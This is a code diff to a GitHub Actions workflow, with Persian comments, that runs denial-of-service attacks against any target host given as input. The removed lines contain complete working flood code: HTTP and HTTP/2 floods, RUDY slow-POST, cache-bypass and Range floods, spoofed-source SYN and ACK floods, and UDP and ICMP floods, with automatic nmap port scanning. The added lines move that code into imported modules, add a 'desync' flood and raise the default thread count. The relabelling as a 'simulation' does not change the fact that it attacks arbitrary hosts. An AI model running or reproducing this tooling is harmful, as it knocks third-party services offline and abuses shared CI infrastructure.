@@ -15,15 +15,16 @@ on:
           - l7_rudy_flood
           - l7_cache_bypass
           - l7_range_flood
+          - l7_desync_flood
           - l4_syn_flood
           - l4_ack_flood
           - l4_udp_flood
           - l4_icmp_flood
       target:
-        description: 'آدرس هدف (example.com یا IP)'
+        description: 'آدرس هدف'
         required: true
       port:
-        description: 'پورت هدف (auto = اسکن خودکار)'
+        description: 'پورت (auto = اسکن)'
         required: true
         default: 'auto'
       duration:
@@ -33,7 +34,7 @@ on:
       threads:
         description: 'تعداد نخ‌ها'
         required: true
-        default: '300'
+        default: '500'
 
 permissions:
   contents: write
@@ -42,23 +43,13 @@ jobs:
   attack:
     runs-on: ubuntu-latest
     steps:
-      - name: دریافت مخزن
-        uses: actions/checkout@v4
-        with:
-          fetch-depth: 0
-
-      - name: تنظیمات Git
-        run: |
-          git config user.name "github-actions[bot]"
-          git config user.email "github-actions[bot]@users.noreply.github.com"
-
-      - name: نصب ابزارها
+      - uses: actions/checkout@v4
+      - name: نصب
         run: |
           sudo apt-get update
           sudo apt-get install -y nmap
           pip3 install aiohttp rich "httpx[http2]" websockets scapy python-nmap
-
-      - name: اجرای حمله
+      - name: اجرا
         env:
           TARGET_HOST: ${{ github.event.inputs.target }}
           TARGET_PORT: ${{ github.event.inputs.port }}
@@ -66,366 +57,52 @@ jobs:
           DURATION: ${{ github.event.inputs.duration }}
           THREADS: ${{ github.event.inputs.threads }}
         run: |
-          python3 << 'PYEOF'
-          import os, sys, time, socket, threading, random, nmap, asyncio, aiohttp, json, concurrent.futures
-          from datetime import datetime, timedelta
+          python3 -c "
+          import os, sys, time, threading, json
+          from datetime import datetime
           from pathlib import Path
-          from rich.console import Console
-          from rich.table import Table
-          from rich.live import Live
-          from rich.panel import Panel
+          from worker_utils import *
+          from all_attacks import *
 
-          console = Console()
-          CACHE_DIR = Path("scan_results")
-          CACHE_FILE = CACHE_DIR / "targets_cache.json"
-          REPORT_FILE = "attack_report.txt"
-          CACHE_VALID_HOURS = 24
+          TARGET = os.environ['TARGET_HOST']
+          ATTACK = os.environ['ATTACK_TYPE']
+          DURATION = int(os.environ['DURATION'])
+          THREADS = int(os.environ['THREADS'])
+          PORT_ARG = os.environ['TARGET_PORT'].strip().lower()
+          REPORT_FILE = 'attack_report.txt'
 
-          # ===== رویداد توقف سراسری =====
-          stop_event = threading.Event()
-
-          def load_cache():
-              if not CACHE_FILE.exists(): return {}
-              try:
-                  with open(CACHE_FILE, 'r') as f: return json.load(f)
-              except: return {}
-
-          def save_cache(cache_data):
-              CACHE_DIR.mkdir(parents=True, exist_ok=True)
-              with open(CACHE_FILE, 'w') as f: json.dump(cache_data, f, indent=2)
-
-          def get_cached_scan(target_ip):
-              cache = load_cache()
-              if target_ip in cache:
-                  entry = cache[target_ip]
-                  scan_time = datetime.fromisoformat(entry['timestamp'])
-                  if datetime.now() - scan_time < timedelta(hours=CACHE_VALID_HOURS):
-                      console.print(f"[green]✅ کش معتبر برای {target_ip}[/green]")
-                      return entry['ports']
-              return None
-
-          def update_cache(target_ip, target_host, open_ports):
-              cache = load_cache()
-              cache[target_ip] = {'host': target_host, 'timestamp': datetime.now().isoformat(), 'ports': open_ports}
-              save_cache(cache)
-              os.system(f"git add {CACHE_FILE} && git commit -m 'Update cache for {target_host}' && git push 2>/dev/null || true")
-
-          stats = {'sent': 0, 'success': 0, 'failed': 0, 'start_time': time.time(), 'lock': threading.Lock()}
-          def increment(key, amount=1):
-              with stats['lock']: stats[key] += amount
-          def get_stats():
-              with stats['lock']:
-                  elapsed = time.time() - stats['start_time']
-                  return {'sent': stats['sent'], 'success': stats['success'], 'failed': stats['failed'], 'elapsed': elapsed, 'rps': stats['sent'] / elapsed if elapsed > 0 else 0}
-
-          def resolve_target(target):
-              for prefix in ['https://', 'http://']:
-                  if target.startswith(prefix): target = target[len(prefix):]
-              target = target.split('/')[0].split(':')[0]
-              try:
-                  addrs = socket.getaddrinfo(target, None, socket.AF_INET, socket.SOCK_STREAM)
-                  return addrs[0][4][0]
-              except:
-                  return None
-
-          COMMON_HTTP_PORTS = [80, 443, 8080, 8443, 3000, 8000, 9000, 5000, 4000, 4443]
-
-          def check_port(ip, port, timeout=0.5):
-              try:
-                  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                  sock.settimeout(timeout)
-                  result = sock.connect_ex((ip, port))
-                  sock.close()
-                  return port if result == 0 else None
-              except:
-                  return None
-
-          def fast_http_scan(ip):
-              open_ports = []
-              with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
-                  future_to_port = {executor.submit(check_port, ip, port): port for port in COMMON_HTTP_PORTS}
-                  for future in concurrent.futures.as_completed(future_to_port):
-                      port = future_to_port[future]
-                      try:
-                          res = future.result()
-                          if res is not None:
-                              open_ports.append({'port': res, 'service': 'http' if res in (80,8080,8000,3000,5000,4000) else 'https'})
-                      except: pass
-              return open_ports
-
-          def deep_scan_ports(ip):
-              nm = nmap.PortScanner()
-              nm.scan(hosts=ip, arguments=f'-sT -sV -p 1-20000 --min-rate 10000 --max-retries 0')
-              open_ports = []
-              if ip in nm.all_hosts():
-                  for proto in nm[ip].all_protocols():
-                      for port in sorted(nm[ip][proto].keys()):
-                          if nm[ip][proto][port]['state'] == 'open':
-                              service = nm[ip][proto][port]['name']
-                              open_ports.append({'port': port, 'service': service})
-              return open_ports
-
-          def discover_ports(ip, attack_type):
-              if attack_type.startswith('l7'):
-                  ports = fast_http_scan(ip)
-                  if ports: return ports
-                  console.print("[yellow]⚠️ رفتن به Nmap...[/yellow]")
-              return deep_scan_ports(ip)
-
-          USER_AGENTS = [
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:119.0) Gecko/20100101 Firefox/119.0",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-              "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
-              "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
-              "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/105.0.0.0",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
-              "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-              "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-              "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:78.0) Gecko/20100101 Firefox/78.0",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
-          ]
-          def get_random_ua(): return random.choice(USER_AGENTS)
-
-          RANDOM_PATHS = [
-              "/", "/index.html", "/home", "/about", "/contact", "/api/v1/status", "/api/v2/users",
-              "/login", "/signup", "/search", "/products", "/categories", "/blog", "/news",
-              "/images/logo.png", "/css/style.css", "/js/app.js", "/favicon.ico", "/robots.txt",
-              "/sitemap.xml", "/feed", "/wp-admin/", "/wp-content/", "/.env", "/config",
-              "/api/v1/auth", "/api/v2/data", "/graphql", "/oauth/token", "/status",
-              "/health", "/ping", "/version", "/metrics", "/stats", "/analytics",
-          ]
-          def get_random_path(): return random.choice(RANDOM_PATHS)
-
-          # ===== کارگرهای جدید با پشتیبانی از stop_event =====
-          async def http_worker(url, worker_id):
-              connector = aiohttp.TCPConnector(limit=0, force_close=False)
-              async with aiohttp.ClientSession(connector=connector) as session:
-                  while not stop_event.is_set():
-                      headers = {
-                          "User-Agent": get_random_ua(),
-                          "Accept": "*/*",
-                          "Accept-Language": random.choice(["en-US,en;q=0.9", "fr;q=0.8", "de;q=0.7"]),
-                          "Cache-Control": "no-cache",
-                          "Connection": "keep-alive",
-                      }
-                      try:
-                          async with session.get(url.rstrip('/') + get_random_path(), headers=headers, timeout=5) as r:
-                              increment('sent')
-                              if r.status < 500: increment('success')
-                              else: increment('failed')
-                      except:
-                          increment('sent'); increment('failed')
-                      await asyncio.sleep(0.0001)
-
-          async def http2_worker(url, worker_id):
-              import httpx
-              async with httpx.AsyncClient(http2=True, verify=False, timeout=5.0) as client:
-                  while not stop_event.is_set():
-                      headers = {"User-Agent": get_random_ua(), "Accept": "*/*"}
-                      try:
-                          r = await client.get(url.rstrip('/') + get_random_path(), headers=headers)
-                          increment('sent')
-                          if r.status_code < 500: increment('success')
-                          else: increment('failed')
-                      except:
-                          increment('sent'); increment('failed')
-                      await asyncio.sleep(0.0001)
-
-          async def rudy_worker(url, worker_id):
-              parsed = url.replace('https://', '').replace('http://', '').split('/')[0]
-              host = parsed.split(':')[0]
-              port = 443 if 'https' in url else 80
-              while not stop_event.is_set():
-                  try:
-                      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                      sock.settimeout(120)
-                      sock.connect((host, port))
-                      sock.send(f"POST {get_random_path()} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {get_random_ua()}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 9999999\r\nConnection: keep-alive\r\n\r\n".encode())
-                      for _ in range(300):
-                          if stop_event.is_set(): break
-                          sock.send(random.choices(b"abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(5,15)))
-                          time.sleep(random.uniform(5, 15))
-                          increment('sent'); increment('success')
-                      sock.close()
-                  except:
-                      increment('sent'); increment('failed')
-                      await asyncio.sleep(1)
-
-          async def cache_bypass_worker(url, worker_id):
-              connector = aiohttp.TCPConnector(limit=0, force_close=False)
-              async with aiohttp.ClientSession(connector=connector) as session:
-                  while not stop_event.is_set():
-                      params = {f"cachebuster_{random.randint(1000,9999)}": random.randint(100000, 999999) for _ in range(random.randint(3,8))}
-                      headers = {
-                          "User-Agent": get_random_ua(),
-                          "Cache-Control": "no-cache, no-store, must-revalidate",
-                          "Pragma": "no-cache",
-                          "Vary": "User-Agent",
-                      }
-                      try:
-                          async with session.get(url.rstrip('/') + get_random_path(), params=params, headers=headers, timeout=5) as r:
-                              increment('sent')
-                              if r.status < 500: increment('success')
-                              else: increment('failed')
-                      except:
-                          increment('sent'); increment('failed')
-                      await asyncio.sleep(0.001)
-
-          async def range_worker(url, worker_id):
-              connector = aiohttp.TCPConnector(limit=0, force_close=False)
-              async with aiohttp.ClientSession(connector=connector) as session:
-                  while not stop_event.is_set():
-                      headers = {
-                          "User-Agent": get_random_ua(),
-                          "Range": f"bytes={random.randint(0,1024)}-{random.randint(1025,1048576)}",
-                          "Accept-Encoding": "identity",
-                      }
-                      try:
-                          async with session.get(url.rstrip('/') + get_random_path(), headers=headers, timeout=5) as r:
-                              increment('sent')
-                              if r.status < 500: increment('success')
-                              else: increment('failed')
-                      except:
-                          increment('sent'); increment('failed')
-                      await asyncio.sleep(0.001)
-
-          async def mixed_worker(url, worker_id):
-              while not stop_event.is_set():
-                  choice = random.randint(1, 10)
-                  if choice <= 3: await http_worker(url, worker_id)
-                  elif choice <= 5: await http2_worker(url, worker_id)
-                  elif choice <= 6: await cache_bypass_worker(url, worker_id)
-                  elif choice <= 7: await range_worker(url, worker_id)
-                  elif choice <= 8:
-                      if stop_event.is_set(): break
-                      try:
-                          parsed = url.replace('https://', '').replace('http://', '').split('/')[0]
-                          host = parsed.split(':')[0]
-                          port = 443 if 'https' in url else 80
-                          sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                          sock.settimeout(3)
-                          sock.connect((host, port))
-                          sock.send(f"GET {get_random_path()} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {get_random_ua()}\r\n".encode())
-                          for _ in range(random.randint(3, 8)):
-                              if stop_event.is_set(): break
-                              sock.send(f"X-{random.randint(0,999)}: {random.randint(0,999)}\r\n".encode())
-                              time.sleep(random.uniform(0.1, 0.5))
-                          increment('sent'); increment('success')
-                          sock.close()
-                      except:
-                          increment('sent'); increment('failed')
-                  else:
-                      await rudy_worker(url, worker_id)
-
-          def syn_worker(ip, port):
-              from scapy.all import IP, TCP, send
-              while not stop_event.is_set():
-                  src = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
-                  pkt = IP(src=src, dst=ip)/TCP(sport=random.randint(1024,65535), dport=port, flags="S")
-                  send(pkt, verbose=False)
-                  increment('sent'); increment('success')
-
-          def ack_worker(ip, port):
-              from scapy.all import IP, TCP, send
-              while not stop_event.is_set():
-                  src = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
-                  pkt = IP(src=src, dst=ip)/TCP(sport=random.randint(1024,65535), dport=port, flags="A")
-                  send(pkt, verbose=False)
-                  increment('sent'); increment('success')
-
-          def udp_worker(ip, port):
-              sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-              while not stop_event.is_set():
-                  sock.sendto(random._urandom(random.randint(1024, 4096)), (ip, port))
-                  increment('sent'); increment('success')
-
-          def icmp_worker(ip):
-              from scapy.all import IP, ICMP, send
-              while not stop_event.is_set():
-                  pkt = IP(dst=ip)/ICMP()/random._urandom(random.randint(64, 1024))
-                  send(pkt, verbose=False)
-                  increment('sent'); increment('success')
-
-          def run_async_flood(worker_func, url, workers):
-              loop = asyncio.new_event_loop()
-              asyncio.set_event_loop(loop)
-              tasks = [worker_func(url, i) for i in range(workers)]
-              try:
-                  loop.run_until_complete(asyncio.gather(*tasks))
-              except:
-                  pass
-
-          def stats_display():
-              s = get_stats()
-              table = Table(show_header=False, box=None, padding=(0,2))
-              table.add_column("متریک", style="cyan"); table.add_column("مقدار", style="bold white")
-              table.add_row("📤 ارسالی", f"{s['sent']:,}")
-              table.add_row("✅ موفق", f"[green]{s['success']:,}[/green]")
-              table.add_row("❌ ناموفق", f"[red]{s['failed']:,}[/red]")
-              success_rate = (s['success']/(s['sent'] or 1))*100
-              table.add_row("🎯 نرخ موفقیت", f"[bold yellow]{success_rate:.1f}%[/bold yellow]")
-              table.add_row("⚡ RPS", f"{s['rps']:.0f}")
-              table.add_row("⏱️ زمان", f"{s['elapsed']:.1f}s")
-              return Panel(table, title="[bold green]🔥 آمار زنده[/bold green]", border_style="green")
-
-          TARGET = os.environ["TARGET_HOST"]
-          ATTACK = os.environ["ATTACK_TYPE"]
-          DURATION = int(os.environ["DURATION"])
-          THREADS = int(os.environ["THREADS"])
-          PORT_ARG = os.environ["TARGET_PORT"].strip().lower()
-
+          console.print('[bold red]DDoS Simulation Toolkit[/bold red]')
           ip = resolve_target(TARGET)
           if ip is None:
-              console.print("[red]❌ نمی‌تونم IP رو پیدا کنم.[/red]")
+              console.print('[red]❌ نمی‌تونم IP رو پیدا کنم.[/red]')
               sys.exit(1)
-          console.print(f"🎯 IP هدف: [bold cyan]{ip}[/bold cyan]")
+          console.print(f'🎯 IP هدف: [bold cyan]{ip}[/bold cyan]')
 
           target_ports = None
           cached_ports = get_cached_scan(ip)
           if cached_ports is not None and PORT_ARG == 'auto':
               target_ports = cached_ports
-              console.print("[green]♻️ استفاده از کش.[/green]")
+              console.print('[green]♻️ استفاده از کش.[/green]')
 
           if target_ports is None:
               if PORT_ARG == 'auto':
                   open_ports = discover_ports(ip, ATTACK)
                   if not open_ports:
-                      console.print("[red]❌ پورتی پیدا نشد.[/red]")
+                      console.print('[red]❌ پورتی پیدا نشد.[/red]')
                       sys.exit(1)
                   update_cache(ip, TARGET, open_ports)
                   target_ports = [p['port'] for p in open_ports]
               else:
-                  target_ports = [int(os.environ["TARGET_PORT"])]
+                  target_ports = [int(os.environ['TARGET_PORT'])]
 
-          console.print(f"🎯 پورت‌های هدف: [bold yellow]{target_ports}[/bold yellow]")
-          console.print(f"⚡ نوع حمله: [bold magenta]{ATTACK}[/bold magenta]")
-          console.print(f"⏱️ مدت: [bold]{DURATION}s[/bold] | 🧵 نخ: [bold]{THREADS}[/bold]\n")
+          console.print(f'🎯 پورت‌های هدف: [bold yellow]{target_ports}[/bold yellow]')
+          console.print(f'⚡ نوع حمله: [bold magenta]{ATTACK}[/bold magenta]')
+          console.print(f'⏱️ مدت: [bold]{DURATION}s[/bold] | 🧵 نخ: [bold]{THREADS}[/bold]\n')
 
           for port in target_ports:
-              scheme = "https" if port == 443 else "http"
-              base_url = f"{scheme}://{TARGET}" if port in (80, 443) else f"{scheme}://{TARGET}:{port}"
-              console.print(f"[bold green]🚀 شروع حمله روی {base_url}[/bold green]")
+              scheme = 'https' if port == 443 else 'http'
+              base_url = f'{scheme}://{TARGET}' if port in (80, 443) else f'{scheme}://{TARGET}:{port}'
+              console.print(f'[bold green]🚀 شروع حمله روی {base_url}[/bold green]')
 
               if ATTACK == 'l7_http_flood':
                   for _ in range(THREADS):
@@ -451,6 +128,10 @@ jobs:
                   for _ in range(THREADS):
                       t = threading.Thread(target=run_async_flood, args=(range_worker, base_url, 4))
                       t.daemon = True; t.start()
+              elif ATTACK == 'l7_desync_flood':
+                  for _ in range(THREADS):
+                      t = threading.Thread(target=run_async_flood, args=(desync_worker, base_url, 4))
+                      t.daemon = True; t.start()
               elif ATTACK == 'l4_syn_flood':
                   for _ in range(THREADS):
                       t = threading.Thread(target=syn_worker, args=(ip, port))
@@ -475,41 +156,39 @@ jobs:
                   time.sleep(0.5)
                   live.update(stats_display())
 
-          # ===== توقف کامل =====
           stop_event.set()
-          time.sleep(0.5)  # کمی صبر برای متوقف شدن نخ‌ها
-
+          time.sleep(0.5)
           final = get_stats()
-          console.print("\n[bold green]✅ حمله کاملاً متوقف شد.[/bold green]")
+          console.print('\n[bold green]✅ حمله کاملاً متوقف شد.[/bold green]')
 
           success_rate = (final['success']/(final['sent'] or 1))*100
           report_lines = [
-              "📊 گزارش حمله DDoS",
-              "========================",
-              "🎯 هدف: %s (IP: %s)" % (TARGET, ip),
-              "🔌 پورت‌های هدف: %s" % str(target_ports),
-              "⚡ نوع حمله: %s" % ATTACK,
-              "⏱️ مدت زمان: %s ثانیه" % DURATION,
-              "📤 کل بسته‌های ارسالی: %s" % format(final['sent'], ','),
-              "✅ موفق: %s" % format(final['success'], ','),
-              "❌ ناموفق: %s" % format(final['failed'], ','),
-              "🎯 نرخ موفقیت: %.2f%%" % success_rate,
-              "⚡ میانگین RPS: %.0f" % final['rps'],
-              "🕒 زمان پایان: %s" % datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+              '📊 گزارش حمله DDoS',
+              '========================',
+              f'🎯 هدف: {TARGET} (IP: {ip})',
+              f'🔌 پورت‌های هدف: {target_ports}',
+              f'⚡ نوع حمله: {ATTACK}',
+              f'⏱️ مدت زمان: {DURATION} ثانیه',
+              f'📤 کل بسته‌های ارسالی: {final[\"sent\"]:,}',
+              f'✅ موفق: {final[\"success\"]:,}',
+              f'❌ ناموفق: {final[\"failed\"]:,}',
+              f'🎯 نرخ موفقیت: {success_rate:.2f}%',
+              f'⚡ میانگین RPS: {final[\"rps\"]:.0f}',
+              f'🕒 زمان پایان: {datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")}',
           ]
-          report_content = "\n".join(report_lines)
+          report_content = '\n'.join(report_lines)
           with open(REPORT_FILE, 'w') as f:
               f.write(report_content)
-          os.system(f"git add {REPORT_FILE} && git commit -m 'Add attack report' && git push 2>/dev/null || true")
-          console.print(f"[green]📄 گزارش حمله در {REPORT_FILE} ذخیره شد.[/green]")
+          os.system(f'git add {REPORT_FILE} && git commit -m \"Add attack report\" && git push 2>/dev/null || true')
+          console.print(f'[green]📄 گزارش حمله در {REPORT_FILE} ذخیره شد.[/green]')
 
-          summary = Table(title="📊 گزارش نهایی", show_header=True)
-          summary.add_column("متریک", style="cyan"); summary.add_column("مقدار", style="bold white")
-          summary.add_row("کل ارسالی", f"{final['sent']:,}")
-          summary.add_row("موفق", f"{final['success']:,}")
-          summary.add_row("ناموفق", f"{final['failed']:,}")
-          summary.add_row("نرخ موفقیت", f"{success_rate:.1f}%")
-          summary.add_row("RPS میانگین", f"{final['rps']:.0f}")
-          summary.add_row("زمان کل", f"{final['elapsed']:.1f}s")
+          summary = Table(title='📊 گزارش نهایی', show_header=True)
+          summary.add_column('متریک', style='cyan'); summary.add_column('مقدار', style='bold white')
+          summary.add_row('کل ارسالی', f'{final[\"sent\"]:,}')
+          summary.add_row('موفق', f'{final[\"success\"]:,}')
+          summary.add_row('ناموفق', f'{final[\"failed\"]:,}')
+          summary.add_row('نرخ موفقیت', f'{success_rate:.1f}%')
+          summary.add_row('RPS میانگین', f'{final[\"rps\"]:.0f}')
+          summary.add_row('زمان کل', f'{final[\"elapsed\"]:.1f}s')
           console.print(summary)
-          PYEOF
+          "
